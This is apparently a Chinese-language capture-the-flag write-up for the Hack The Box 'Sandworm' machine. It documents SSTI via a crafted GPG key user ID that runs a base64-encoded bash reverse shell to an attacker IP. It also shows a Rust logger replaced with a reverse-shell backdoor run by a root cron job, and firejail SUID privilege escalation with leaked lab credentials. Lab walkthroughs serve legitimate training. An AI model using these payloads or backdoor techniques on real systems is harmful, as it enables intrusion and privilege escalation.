(0.32s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://ssa.htb/ 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-title: Secret Spy Agency | Secret Security Service |_http-server-header: nginx/1.18.0 (Ubuntu) | ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA | Not valid before: 2023-05-04T18:03:25 |_Not valid after: 2050-09-19T18:03:25 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). 开了22,80,443端口 image.png 修改hosts文件 ssa.htb该网站是利用非对称加密算法技术来对内容进行加解密运算运用的加密技术就是PGP 主要用于邮件加密方向的技术 image.png 原理就是:Encrypt 在加密的时候，先生成一个(随机的)对称密钥，TlakvAQkCu2u，通过这个对称密码对data进行加密 然后发送者通过接受者的公钥把这个随机生成的对称密钥进行加密，然后把经过对称密钥加密的Data和经过接受者公钥加密的对称密钥一起发送 Decrypt 先把Data和对称加密的密钥分离出来，此时这两个类型的数据都是加密的 接受者通过自己的私钥先把对称密钥(q4fzNeBCRSyqv)解密得到TlakvAQkCu2u 再使用对称密钥(TlakvAQkCu2u)对Data进行解密 解密内容┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/SandWorm] └─# cat message.txt nihao123;whaomi;# ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/SandWorm] └─# gpg --encrypt --recipient-file id_rsa.pub message.txt File &#39;message.txt.gpg&#39; exists. Overwrite? (y/N) y ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/SandWorm] └─# cat message.txt nihao123;whaomi;# ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/SandWorm] └─# cat message.txt.gpg | base64 hQIMA2u3M9ko0UzmAQ/+JxrwZH9aQaGjlJwO1Nv4k07oOq9Q8wgVScwXhVzgjeXnwC+/NX7caz3P P1ygbXNBsAbKykLMJG+EzjWmsG5fwnC8EqjK1fwtkNjERCwwA91s/OdoT788g8G1RzWFhi++JzWC bRuCokTb81ju7blnyJT/EhawTK/CcGUEhyEmGnQhmvKByWhQH1F3KJNPgHsvLkaXyNU/mXvXRyeU ljVAG5TaFL/yJPfoRGlXsBGfDXilsAk28IpM/dddkdLtgPzwoSLwc9B9mZgYuC67POFryDA4GmSW 9qMo2P5SsNse1JXLExQPkaGbXrI1GTQFMZbpwHsTAS3riwaCEX8QipC2R4Z4j526/a15Bqkl10v3 KEDB6wPDbPaT1/8yzb9OSssDy+RR1FDK8hK1eq84KmCXfB9NiVIBkdHrDycDni+LXPwZfytc6kja F7FseL0YgJBm5ou8r6SEvYMVkYyvANhziJLMt2Yc3XXKkiOIv6+ycmEGHwVC3qO0DJocGyzLSTy/ a+sZyHxWi26ep5JYFokCRKx+SWSb/0ICkOPuMoulR8lGUSxEFtDlbuiPSXdTvc6eWPitoZa9qeIv +xr//HFfB4JduiL0Rh3OqYJbmTU4oSZY7eTtSRnnD4ifKATazhxQwgkzPAiRBf+CDz2iCPThT7YO g1pkyG+10AVIQ6V0UQzSVwHFSXE/VUvur4u8j/WHIVk1MeE1nQ9t8sKvZZzCkWQxvGIYik2ZEUla tsVPsjytAoFvqR6hMqg/w3RyDLAgbdQX/t/u6JCC6GQYRthCiyfMtlB5PQKeGQ== ┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/SandWorm] image.png 通过这个网站对加密的内容进行url编码 image.png 验证签名 image.png image.png 验证签名成功 Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Thu 04 May 2023 04:13:47 PM UTC gpg: using RSA key D6BA9423021A0839CCC6F3C8C61D429110B625D4 [GNUPG:] KEY_CONSIDERED D6BA9423021A0839CCC6F3C8C61D429110B625D4 0 [GNUPG:] SIG_ID CsBPTL20G6/YKI6iNhSErGIXx5U 2023-05-04 1683216827 [GNUPG:] KEY_CONSIDERED D6BA9423021A0839CCC6F3C8C61D429110B625D4 0 [GNUPG:] GOODSIG C61D429110B625D4 SSA (Official PGP Key of the Secret Spy Agency.) gpg: Good signature from &quot;SSA (Official PGP Key of the Secret Spy Agency.) &quot; [ultimate] [GNUPG:] VALIDSIG D6BA9423021A0839CCC6F3C8C61D429110B625D4 2023-05-04 1683216827 0 4 0 1 8 01 D6BA9423021A0839CCC6F3C8C61D429110B625D4 [GNUPG:] TRUST_ULTIMATE 0 pgp 发现这里验证签名会验证信息，网站本身是flask 搭建的，想办法看看哪里可以ssti注入网站的公私钥是使用gpg命令来实现的，我们看看常见的命令 以下是 gpg 常见命令及其说明： gpg --gen-key: 生成一个新的密钥对，包括公钥和私钥。在生成过程中，您将需要输入名称、电子邮件地址和选定的密码等信息。 gpg --list-keys: 列出所有已经生成的公钥。 gpg --import &lt;filename&gt;: 导入公钥或者私钥文件。 gpg --armor --export &lt;email&gt;: 导出指定邮箱的公钥，并把结果输出为 ASCII 编码的格式。 gpg --encrypt --recipient &lt;recipient-email&gt; &lt;filename&gt;：使用指定接收者的公钥来加密文件，使其只能被其对应的私钥持有者解密。 gpg --decrypt &lt;filename&gt;: 解密文件，前提是使用者必须拥有相应的私钥才行。 gpg --verify &lt;filename&gt;: 验证签名文件是否和原始文件匹配。 这些是最常用的 GPG 命令，但不止于此，GPG 还有许多其他命令。建议查看 GPG 的官方文档以获得更详细的信息。 以下是和签名有关系的常见 GPG 命令及其说明： gpg --sign &lt;filename&gt;: 对文件进行数字签名。默认使用用户的默认密钥对进行签名，也可以指定其他密钥。 gpg --clearsign &lt;filename&gt;: 对文件进行清晰签名。这种签名方式不会对整个文件进行加密，而是将签名附加到文件末尾，易于阅读。 gpg --verify &lt;signed-filename&gt;: 验证数字签名是否有效，并检查签名是否由信任的密钥持有者创建。 gpg --detach-sign &lt;filename&gt;: 生成一个独立的签名文件，而不是将签名附加到文件中。这种签名方式通常用于对二进制文件进行签名。 gpg --clearsign &lt;filename&gt;: 对文本文件进行清晰签名。它会将签名附加到文件底部，方便人类阅读。 这些是和签名相关的一些常见 GPG 命令，但还有许多其他命令。建议查看 GPG 的官方文档以获得更详细的信息。 生成自己的公私钥信息以及签名信息 ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# gpg --gen-key gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Note: Use &quot;gpg --full-generate-key&quot; for a full featured key generation dialog. GnuPG needs to construct a user ID to identify your key. Real name: {{1*7}}@qq.com Email address: {{1*7}}@qq.com You selected this USER-ID: &quot;{{1*7}}@qq.com &lt;{{1*7}}@qq.com&gt;&quot; Change (N)ame, (E)mail, or (O)kay/(Q)uit? O We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. We need to generate a lot of random bytes. It is a good idea to perform some other action (type on the keyboard, move the mouse, utilize the disks) during the prime generation; this gives the random number generator a better chance to gain enough entropy. gpg: revocation certificate stored as &#39;/root/.gnupg/openpgp-revocs.d/7DEF520F8486A158CEFE281E3EF0D0B3755A0252.rev&#39; public and secret key created and signed. pub rsa3072 2023-06-20 [SC] [expires: 2025-06-19] 7DEF520F8486A158CEFE281E3EF0D0B3755A0252 uid {{1*7}}@qq.com &lt;{{1*7}}@qq.com&gt; sub rsa3072 2023-06-20 [E] [expires: 2025-06-19] ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# ls ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# gpg --list-key gpg: checking the trustdb gpg: marginals needed: 3 completes needed: 1 trust model: pgp gpg: depth: 0 valid: 1 signed: 0 trust: 0-, 0q, 0n, 0m, 0f, 1u gpg: next trustdb check due at 2025-06-19 /root/.gnupg/pubring.kbx ------------------------ pub rsa3072 2023-06-20 [SC] [expires: 2025-06-19] 7DEF520F8486A158CEFE281E3EF0D0B3755A0252 uid [ultimate] {{1*7}}@qq.com &lt;{{1*7}}@qq.com&gt; sub rsa3072 2023-06-20 [E] [expires: 2025-06-19] ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# echo test &gt; msg ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# ls msg ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# gpg --armor --export {{1*7}}@qq.com -----BEGIN PGP PUBLIC KEY BLOCK----- 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 myNm8HZYYVAsuR1Od5o5c4NyAKILTg0= =uSFb -----END PGP PUBLIC KEY BLOCK----- ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# ls msg ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# gpg --armor --export {{1*7}}@qq.com &gt; publicKey ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# ls msg publicKey ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# gpg --clear-sign msg ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# ls msg msg.asc publicKey ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# cat msg.asc -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA512 test -----BEGIN PGP SIGNATURE----- iQGzBAEBCgAdFiEEfe9SD4SGoVjO/igePvDQs3VaAlIFAmSRsZEACgkQPvDQs3Va AlLDewwAzeKPNfT9nZrggzP9uJcyDcd1aMRoespprYTKq3d8NfS3CCfAdrN3vkCb BdBkCCeTjeJ1ket39EKRk3kJZ+zWrWgYFVPmHGan4MiVLY+41ecQ+jlnYaviNVAj E6C54sD7AsLtRRDEmeRLkA0GNo2/Zxy6wSr9HY71p6XM+dl0r+eDUNSjwj+uKRHX UktBB/xUdglLeBdp/+y8RSGkOmiIUS3KBBc3qzid+OYUqUeT+sVPln2FL03RQ6h2 VOwoRBpgtOMmKQXnE1ndLS0NdAXeG5tVBM+I6BVjsHhsGlL9iVz9TPK9wuz4L4nN w538BFrIzYdnZ2EeaAbgSMdZM9FsVH36r3ezh42E9GAF08tdogiRrJrRGf3aHIwS dIw3hbL2skcDwi/qIkm5ed77RKouLmb1qFS8o1gNci+lYQMIyrUdI9ChqaV9Sq+Z MTOFOfbPTsOQRf0iyUESCFUovzUH93q1rTU3Y8yvvAhnMxrIuMzj0kgXY2WTUBjQ /qRE4kXr =SXBu -----END PGP SIGNATURE----- ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# image.png 分别把刚才的公钥和签名放到相应的位置 image.png 发现这里对我们的 7进行了解析说明这里可以进行ssti注入 ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# gpg --edit-key {{1*7}}@qq.com 130 ⨯ gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Secret key is available. sec rsa3072/3EF0D0B3755A0252 created: 2023-06-20 expires: 2025-06-19 usage: SC trust: ultimate validity: ultimate ssb rsa3072/572C2905CEB9039C created: 2023-06-20 expires: 2025-06-19 usage: E [ultimate] (1) {{1*7}}@qq.com &lt;{{1*7}}@qq.com&gt; gpg&gt; adduid Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0NDQgMD4mMQo=|base64 -d|bash\").read() }} Email address: someb0dy@htb.com Comment: You selected this USER-ID: &quot;{{ self.__init__.__globals__.__builtins__.__import__('os').popen(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0NDQgMD4mMQo=|base64 -d|bash\").read() }} &lt;someb0dy@htb.com&gt;&quot; Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O sec rsa3072/3EF0D0B3755A0252 created: 2023-06-20 expires: 2025-06-19 usage: SC trust: ultimate validity: ultimate ssb rsa3072/572C2905CEB9039C created: 2023-06-20 expires: 2025-06-19 usage: E [ultimate] (1) {{1*7}}@qq.com &lt;{{1*7}}@qq.com&gt; [ unknown] (2). {{ self.__init__.__globals__.__builtins__.__import__('os').popen(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0NDQgMD4mMQo=|base64 -d|bash\").read() }} &lt;someb0dy@htb.com&gt; gpg&gt; save ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# gpg --clear-sign msg File &#39;msg.asc&#39; exists. Overwrite? (y/N) y ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# gpg --armor --export {{1*7}}@qq.com &gt; publicKey ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# cat msg.asc -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA512 test -----BEGIN PGP SIGNATURE----- iQGzBAEBCgAdFiEEfe9SD4SGoVjO/igePvDQs3VaAlIFAmSRudoACgkQPvDQs3Va AlJblwv/ZTAXFH+eDDv9zuasML0Gkjv1PgLJuPVz49NVq13mv93Ql0jvEQTS0jyA z3bMfkxQT7/fM+6qEyJ8OIHrfOC/NFQj1WuLWJ45VadIjsz2ZeVmeLYZvAY5izV5 54H7WuO9+qr1bnX04NuwqHbqoU+qMYKQACW462vNO7N4siJuFTEex9DeQPqCLudy mnZ/6OsZniNApRqW9dbw/RwGnbJpE9WdSJ3N5KpL/ZNTVKTIG80wUSOPGEtkd9O0 eslPZNk4MfYim2q8sGG3/F5xTk2u+B0+/CVNr76jphOzhwauoXOka4WV4yCOKfS5 ZhuuklzXbUQ9sgHCDTQFTfXUg1Mhd16K7DdiCf+BHAZDMJk+oXfPqgKPGXPUjvpl l7fqHnToR43qZOoryAhXslu0qZmjvGmyqYRzG52DCeTTjQp5l6BPlokE321T9+9y 8Do6/+1aADfdEj26EaUyCEnIG1NKVs9a3Avwhupn0O8ywpGEx7yT690jX7XyIGUh bc1jOEPD =j2Zl -----END PGP SIGNATURE----- ┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign] └─# cat publicKey -----BEGIN PGP PUBLIC KEY BLOCK----- mQGNBGSRsVABDADPg1tNfZ73JoEo06M3vPrcUMhAjYfe6Rup16w9NWH4WjWmmVkJ FsCnNvl/uEAEhaYpNHBaiuvc0H3nVV9GYkd0SHF9uxeNHdEn6HgG/76KHM3Ht/3Y WFRlbx98mHcrJdJakhNhvWWE6SUtzvnp2zFanDfWDks1GIEMB9KGkf66AZE9qWcv PmogyZsSRTAHcg0Gper0uDoVmrR+zX1NI53gaGzB1JOcPrYKAForn5Dmd1eQScA7 PKorW1Z4FaEuCEFYQOsN8LmruvUl04LTvFv4crDbfWhhF7RQ0aQbQd4LZJPndBf4 jbq33eTjIFXIbxnxez8XcGnNyhnm2p6s1FAe4kpC9qYBxYTWY2no1mkV90W3hXuf 3yWAxAdTn4mxlfiR128CvBVG7sXCYgGORajyKy5Y7kGSQds+S9zst1XN9twrfy37 varDzuLOZ1aB6Qqt8qqTINLDEeUlpy7B8aTiLPkk4ZbJrbDoGcbO+gXYm9kpEIR3 /fD8slb3o6hVMO8AEQEAAbQfe3sxKjd9fUBxcS5jb20gPHt7MSo3fX1AcXEuY29t PokB1AQTAQoAPhYhBH3vUg+EhqFYzv4oHj7w0LN1WgJSBQJkkbFQAhsDBQkDwmcA BQsJCAcCBhUKCQgLAgQWAgMBAh4BAheAAAoJED7w0LN1WgJS2lIMALBz4V3ixkIR xYZY37LyEHCcIR4IIkBpAJvFPDkY4E+NP1l8HpBOO1dHegKKmU+RPtHywsjTPdkx bjq/Q11Jr3G8fz3DPBSOG9iNutCN/LghhtuUPa7KIRxgjDjEU1sg/zYVSxQkOmKD irpN39VL8pFabPRogsaM4VfrN+pobL9mYp/yfqagj65aG5SDJq4jxY8yAIOTk31N W9z16aCW6xb2N7nc9MFVwPFxZmFQt69J7dNrSA2mDQadRJPJiZk8DCBP75vCMQIf 1+eurg87eGcIDEVtvyj+ye625V0k5td6x8IYF0d9l98/0eg1gETPnCKNzWxfpVDN ow9rAc/zsClQIMHQruCvwezWPsxrtYkVqvwDg2+FZoNrelz2pz5Ke/FpjW68Us0x NbvUx9uzuHcnjRo1em5IClJhLnrv7En4mqnGezaB3agnkfIEE5TfBNvOFrOjAM0s GXgQAdzaLsAa+p+DxplBZmv6Up/OYW1m6phrZvVM4hOrDtMBtProxrSte3sgc2Vs Zi5fX2luaXRfXy5fX2dsb2JhbHNfXy5fX2J1aWx0aW5zX18uX19pbXBvcnRfXygn b3MnKS5wb3BlbigiZWNobyBZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TUM0 eE1DNHhOaTQyTHpRME5EUWdNRDRtTVFvPXxiYXNlNjQgLWR8YmFzaCIpLnJlYWQo KSB9fSA8c29tZWIwZHlAaHRiLmNvbT6JAdQEEwEKAD4WIQR971IPhIahWM7+KB4+ 8NCzdVoCUgUCZJG51AIbAwUJA8JnAAULCQgHAgYVCgkICwIEFgIDAQIeAQIXgAAK CRA+8NCzdVoCUiiFC/9KN/l8WzTem/SLdguJPvBkTi7ggZQb3vGu/7thhb00OKtL Of944tkCj8VNqEkRFiMBMYT7HbZ+2nibA+AXz84eOAchKmXqGK/ahd4tDgIzSg9C 0+tHwg3ebbdh7xFKYC87PLb7nWqmrOp1vF+KAkh57iTIkkc6IBBtyWSEE2TvVCm6 S2hUAyPusLag5xfMHIWUGRL3/hWiucXoXevPbMx1DRZo1+C5xKCHBWVeTg1GmSJN aG2CVz2hwv2vRbPs3E84d0M+dnZ42+2L6rnCQrzkULKustg2OdjcWb9kymgtmJjr 8O1N0bdOvw1f9onoH1Hl25Kj8nxsfoMysChJbCYZ+yckBhFcrVBxsOAifzYZ7Xm4 ve3OjqOjhcW5J+eR30d4jtxQ4V9XFfQ4pFzt3LJhq5AIAE7iOTCWR1BEah4ILhhf dg56bnEV2zJoPENUG5HzsWAfl7YP1J0Q/nJ7Mrhf+E7t28lrPV9RvAo/a2Dgwz5V URn5wtV/ehUGfPMv9BG5AY0EZJGxUAEMAMWpnjKBvUuICk+9Sa+++cuNoPahyuA9 aRdF2ducxu/ws8QZzxRxPjHZSlBvsc1J3DaSUJChiGOlwqOlmbipZwuhfta1I8Il 1cSX8e1eptF8YnsqlRqON/GJZNePPEk+u/oBvqNHX6Af+1mM/6AbiUdzwqGrVUri LYSavPlZGhE5rEGJPQ64UwwLvRfYXbMdrDpDlblybM9Ws17UjImqFHAiRNQLyKj4 rS230U4CFZcyQXG5Tv0bxZinQOp8luafYT+hSyNq0cqrBLdfxrC9S2gBHMWT6Ky9 YxvZmJAeY4Jc6ZXz0psCxSclyCeS++HcMwGbRyentHHLRKKMN8j8qbY3SZLCRun2 tYYbiEKM2ZDUqeJonVqBP7tOFrRieEIEpsWVLSdtynnILfwVWSalakQ8A2nZXQw5 2Z7sesIRvWfOUeyceXdk2B+8ZAWyYGvsQ1kXgaa4/oe/ZaqxkKhMc/6KrpNYyl6+ nS70s8raJBcfuk/EBS0c2UbhsghNzlWn6wARAQABiQG8BBgBCgAmFiEEfe9SD4SG oVjO/igePvDQs3VaAlIFAmSRsVACGwwFCQPCZwAACgkQPvDQs3VaAlKdqAv/QRba difXu4dzA0sXQELbt5va8oO/SMTrgEmCMPDZcrdw7TIC4Bk+zeirgF0GMJruyFhK aQw5LdncpD4fgdkLKERfDbu/WdzF21Cr4Abb4GveBrWLg9/xc0t9VUaLJ/4rC5Xu XCUgDc/jf+VrEjO9BJgm4WfHQpI9/aAaEEVsn+YTB5uaEQpn8oOd6EdwH7WaMJIN GzTv1RgR/vqnaU/RVBmgQsK8YkadKKOAtc+KrAfuJMq17plLigBkTpRlRbQgfffO nnQjmr1xxs74L7aZvEJTvwFCOov7T5LyDtfrpPXiCNhU28UAz/lmHa9UR5YDbDbc 63azRhUdGo0JUmjLA6nQQ2ykaNIN+yi06YNYneI0L0OxJu27qlzAhgO2bmfr+xqF LJwUazGBBUI1ZwfljziZ3bi1Ihw0j7MKYkae4PRn25y5cVzak161GcvmvlG36X0p VEqAhIEbze51irbDS4udKsSyjldUs5sjZvB2WGFQLLkdTneaOXODcgCiC04N =12ny -----END PGP PUBLIC KEY BLOCK----- 反弹shell通过这个方式执行命令进行反弹shell image.png image.png 把上面生成的公钥和签名放到这里 shell!!! atlas@sandworm:/var/www/html/SSA/SSA$ cat __in cat __init__.py from flask import Flask from flask_login import LoginManager from flask_sqlalchemy import SQLAlchemy db = SQLAlchemy() def create_app(): app = Flask(__name__) app.config[&#39;SECRET_KEY&#39;] = &#39;91668c1bc67132e3dcfb5b1a3e0c5c21&#39; app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] = &#39;mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA&#39; db.init_app(app) # blueprint for non-auth parts of app from .app import main as main_blueprint app.register_blueprint(main_blueprint) login_manager = LoginManager() login_manager.login_view = &quot;main.login&quot; login_manager.init_app(app) from .models import User @login_manager.user_loader def load_user(user_id): return User.query.get(int(user_id)) return app 从web根目录的代码中找到了数据库连接密码 username passwd atlas GarlicAndOnionZ42 但是没用mysql这个命令- -，估计是在沙箱中好多命令都执行不了 最后翻home目录下面有一个配置文件 /home/atlas/.config/httpie/sessions/localhost_5000 cat admin.json { &quot;__meta__&quot;: { &quot;about&quot;: &quot;HTTPie session file&quot;, &quot;help&quot;: &quot;https://httpie.io/docs#sessions&quot;, &quot;httpie&quot;: &quot;2.6.0&quot; }, &quot;auth&quot;: { &quot;password&quot;: &quot;quietLiketheWind22&quot;, &quot;type&quot;: null, &quot;username&quot;: &quot;silentobserver&quot; }, &quot;cookies&quot;: { &quot;session&quot;: { &quot;expires&quot;: null, &quot;path&quot;: &quot;/&quot;, &quot;secure&quot;: false, &quot;value&quot;: &quot;eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA&quot; } }, &quot;headers&quot;: { &quot;Accept&quot;: &quot;application/json, */*;q=0.5&quot; } } atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ pwd pwd /home/atlas/.config/httpie/sessions/localhost_5000 username passwd silentobserver quietLiketheWind22 ssh 连接成功 user flag 成功获取 Root image.png image.png 仔细看到应该是有以root权限启动的计划任务 在翻看文件时候&#x2F;opt&#x2F;crates&#x2F;logger&#x2F;src extern crate chrono; use std::fs::OpenOptions; use std::io::Write; use chrono::prelude::*; pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) { let now = Local::now(); let timestamp = now.format(&quot;%Y-%m-%d %H:%M:%S&quot;).to_string(); let log_message = format!(&quot;[{}] - User: {}, Query: {}, Justification: {}\\n&quot;, timestamp, user, query, justification); let mut file = match OpenOptions::new().append(true).create(true).open(&quot;/opt/tipnet/access.log&quot;) { Ok(file) =&gt; file, Err(e) =&gt; { println!(&quot;Error opening log file: {}&quot;, e); return; } }; if let Err(e) = file.write_all(log_message.as_bytes()) { println!(&quot;Error writing to log file: {}&quot;, e); } } 这里有一个记录日志文件的rust文件,猜测应该会执行我们对这个文件具有完全的控制权限修改为反弹shell RustBackDoorextern crate chrono; use std::net::TcpStream; use std::os::unix::io::{AsRawFd, FromRawFd}; use std::process::{Command, Stdio}; pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) { let sock = TcpStream::connect(&quot;&lt;IP attack&gt;:4444&quot;).unwrap(); let fd = sock.as_raw_fd(); Command::new(&quot;/bin/bash&quot;) .arg(&quot;-i&quot;) .stdin(unsafe { Stdio::from_raw_fd(fd) }) .stdout(unsafe { Stdio::from_raw_fd(fd) }) .stderr(unsafe { Stdio::from_raw_fd(fd) }) .spawn() .unwrap() .wait() .unwrap(); } image.png 修改lib.rs之后稍等一会成功，成功反弹shell,此时的atlas用户是没有沙箱限制的，发现id组多了应该 jailer image.png 发现firejail 带有suid 提权的过程和之前的Cerberus靶机一样Refer:https://gist.githubusercontent.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25/raw/86058ce12f69997b2de35c5de7bcd3036654f32f/exploit.py提权脚本 atlas@sandworm:~/someb0dy$ python3 exploit.py python3 exploit.py /home/atlas/someb0dy/exploit.py needs to have the execute bit set for the exploit to work. Run `chmod +x /home/atlas/someb0dy/exploit.py` and try again. atlas@sandworm:~/someb0dy$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; atlas@sandworm:~/someb0dy$ chmod +x chmod +x exploit.py atlas@sandworm:~/someb0dy$ python3 exploit.py python3 exploit.py You can now run &#39;firejail --join=239891&#39; in another terminal to obtain a shell where &#39;sudo su -&#39; should grant you a root shell. ls ls 然后在反弹一次shell在另一个终端中输入 firejail –join&#x3D;239891 再接着 su - atlas@sandworm:/opt/tipnet$ firejail --join=239891 